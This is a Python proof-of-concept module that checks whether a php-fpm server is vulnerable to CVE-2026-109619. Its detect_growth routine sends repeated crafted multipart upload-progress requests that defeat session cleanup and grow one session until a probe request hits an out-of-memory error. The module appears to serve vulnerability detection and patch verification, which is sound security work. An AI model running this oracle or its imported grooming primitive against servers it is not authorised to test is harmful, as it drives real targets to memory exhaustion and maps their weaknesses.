#!/usr/bin/env python3
# INDEX: fpm session-growth OOM-flip -> sink-free patch differential (flip=vulnerable) | fpm | upload_progress on
"""Black-box fpm 'affected' oracle via the CVE-2026-109619 accumulation primitive.

A normal server with session.upload_progress.cleanup=On DELETES each progress record at
MULTIPART_EVENT_END, so a session can never be grown. The bug's accumulation (a trailing
empty-filename $_FILES wall OOMs the multipart parser AFTER the FILE_START flush but BEFORE
END, skipping the cleanup delete) lets an attacker grow one session past memory_limit despite
cleanup=On. The observable, non-destructive consequence: once the session crosses ~memory_limit/3,
a benign session-touch request FLIPS from a normal 200 to a caught OOM ("Allowed memory size ...
exhausted") while decoding the grown record. That ok->OOM flip proves the accumulation surface is
live (upload_progress enabled + cleanup=On defeated + session driven to the memory ceiling) -- a
CVE-2026-109619-specific reachability signal, observable over plain HTTP on php-fpm.

detect_growth() is transport-agnostic: the caller supplies `mint()` -> sid and
`post(parts, cookie) -> body:bytes` (a multipart POST whose body is accumulated), plus `touch`
reusing `post`. Returns {affected, flip_record, records, note}. Reproducible on 8.3.26-fpm.

PATCH DIFFERENTIAL (verified black-box, sink-free, fpm+nginx): the flip is a DEFINITIVE
VULNERABLE signal. Matched labs 8.3.26 (vuln) vs 8.3.36 (patched) at 32M/cleanup=On: the flip
fires 3/3 on vuln at record ~24 (on-disk session grows to ~10MB) and NEVER on patched (on-disk
session stays 0 bytes). The CVE-2026-109618 fix makes the multipart parser's OOM fallible/delayed,
so cleanup runs and deletes each record -> no accumulation -> the decode never OOMs. A patched
build cannot produce the flip. No-flip is therefore consistent with PATCHED, but also with a
regime where the primitive does not apply (8.4.x cheap-field parse that never OOMs the parser, or
a memory_limit too high to reach within the record budget) -> treat no-flip as leaning-patched,
not definitive. Non-crashing (caught OOM, worker survives).
"""
from __future__ import annotations

import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.groom.upload_progress_accumulate import record_parts, PROGRESS_KEY  # noqa: E402

OOM_MARKERS = (b"Allowed memory size", b"bytes exhausted")


def _oom(body):
    return bool(body) and any(m in body for m in OOM_MARKERS)


def touch_parts(sid):
    """A small same-SID upload-progress POST whose pre-RINIT handler decodes the grown
    session record (no wall) -- the probe that flips to OOM once the session is large."""
    return [(b"PHPSESSID", sid.encode() if isinstance(sid, str) else sid, None),
            (PROGRESS_KEY, b"x", None),
            (b"v", b"V" * 128, b"v.bin")]


def detect_growth(mint, post, max_records=40, fnlen=400000, wall=1000):
    """Grow a session over accumulation records and watch a benign same-SID touch flip to a
    caught OOM. `mint() -> sid`; `post(parts, cookie) -> body bytes`. Returns a verdict dict."""
    sid = mint()
    if not sid:
        return {"affected": None, "flip_record": None, "records": 0,
                "note": "could not mint/establish a session id"}
    cookie = "PHPSESSID=" + sid
    # Baseline: a FRESH session must not already OOM on a touch; otherwise a later flip is not
    # attributable to our accumulation (pre-existing large session, or a tiny memory_limit).
    if _oom(post(touch_parts(sid), cookie)):
        return {"affected": None, "flip_record": None, "records": 0,
                "note": "a FRESH session already OOMs on a tiny touch before any accumulation -- "
                        "so the OOM is NOT from this oracle. Most likely the target app's own "
                        "bootstrap is already near the memory_limit (a heavy app at a low limit "
                        "like 32M makes every request near-OOM), or there is pre-existing session "
                        "residue for this id. This oracle needs headroom on a fresh request: "
                        "raise memory_limit, point --post-path at a lightweight PHP endpoint, or "
                        "clear session residue, then re-run. Inconclusive here."}
    for i in range(max_records):
        post(record_parts(i, fnlen, wall), cookie)          # grow one record
        body = post(touch_parts(sid), cookie)               # benign decode probe
        if _oom(body):
            return {"affected": True, "flip_record": i, "records": i + 1,
                    "note": f"session-touch flipped to a caught OOM after {i + 1} accumulation "
                            "records -> cleanup=On defeated, session driven to the memory ceiling "
                            "(CVE-2026-109619 accumulation surface LIVE)"}
    return {"affected": False, "flip_record": None, "records": max_records,
            "note": f"no OOM flip within {max_records} records -- accumulation did not bite "
                    "(cleanup effective, upload_progress off, memory_limit high/-1, or wrong "
                    "endpoint)"}


if __name__ == "__main__":
    # offline marker self-test
    assert _oom(b"...Allowed memory size of 33554432 bytes exhausted...")
    assert not _oom(b"<html>ok</html>")
    print("ok: OOM markers")
